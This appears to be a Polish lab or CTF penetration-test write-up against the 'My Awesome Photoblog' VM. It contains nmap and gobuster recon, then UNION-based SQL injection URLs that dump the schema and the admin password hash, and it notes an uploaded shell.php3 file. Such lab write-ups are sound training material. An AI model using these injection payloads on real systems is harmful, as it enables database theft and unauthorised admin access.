
# Raport z analizy podatności – My Awesome Photoblog

## Recon i identyfikacja usług

### Skanowanie Nmap

Wykonano:
nmap -sV 192.168.56.6

Wyniki:

- 22/tcp  – OpenSSH 5.5p1 (Debian)
- 80/tcp  – Apache 2.2.16 (Debian)
- 25, 110, 119 itd. – proxy Avast

![alt text](img/image-1.png)

### Enumeracja katalogów (Gobuster)

Wykonano:
gobuster dir -u http://192.168.56.6 -w /usr/share/wordlists/dirb/common.txt

Znalezione zasoby:

- /admin        → panel administracyjny
- /images       → katalog plików
- /classes      → backend aplikacji
- /css          → pliki stylów
- /cat          → endpoint dynamiczny (SQLi)
- /all          → lista zdjęć
- /show         → widok zdjęcia
- /index.php    → strona główna

![alt text](img/image-2.png)


## UNION-based SQL Injection

komenda:

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,version(),3,4
```

Wynik:
- MySQL: 5.1.63-0+squeeze1

![alt text](img/image-3.png)

## Enumeracja struktury bazy

### Kolumny tabeli users

Komenda:

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'
```

Wynik:
- id
- login
- password

![](img/image-4.png)

### Pełna struktura
komenda:
```
http://192.168.56.6/cat?id=-1UNION SELECT1,CONCAT(table_name,:,column_name),3,4 FROM information_schema.columns WHERE table_schema=database()

```

![](img/image-5.png)

Tabele:

- users
- pictures
- categories

Kolumny:

users:
- id
- login
- password

pictures:
- id
- title
- img
- cat

categories:
- id
- title


## Ekstrakcja danych

### Hash konta admina


Komenda:
```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(login,0x3a,password),3,4 FROM users
```

![](img/image-6.png)

Wynik(Hash MD5):
- admin:8efe310f9ab3efeae8d410a8e0166eb2

![](img/image-7.png)

Uzyskaliśmy dostęp do konta admina

![alt text](img/image-8.png)

dzięki czemu możemy:

- mieć dostęp do listy zdjęć
- możliwość dodawania nowych
- możliwość usuwania


![alt text](img/image-9.png)


### Pictures

komenda:
http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(id,':',title,':',img),3,4 FROM pictures

Wynik:

- 1:hacker:hacker.png
- 2:ruby:ruby.jpg
- 3:cthulhu:cthulhu.png
- 6:danger_cat:cat_in_balaclava.jpeg
- 8:reversedphp:shell.php3

![Image](img/image-10.png)


Widoczny wpis:
- reversedphp

Wnioski:
- panel umożliwia upload plików


## Podatności

Zidentyfikowane:

1. SQL Injection (UNION-based)
2. Brak walidacji danych wejściowych
3. Ekspozycja struktury DB
4. Panel admina dostępny bez dodatkowych zabezpieczeń
5. Możliwy upload plików

## Wnioski końcowe

- Aplikacja jest klasycznym przykładem podatności SQL Injection
- Możliwa pełna kompromitacja bazy danych
- Panel admina zwiększa powierzchnię ataku
- Brak podstawowych mechanizmów bezpieczeństwa
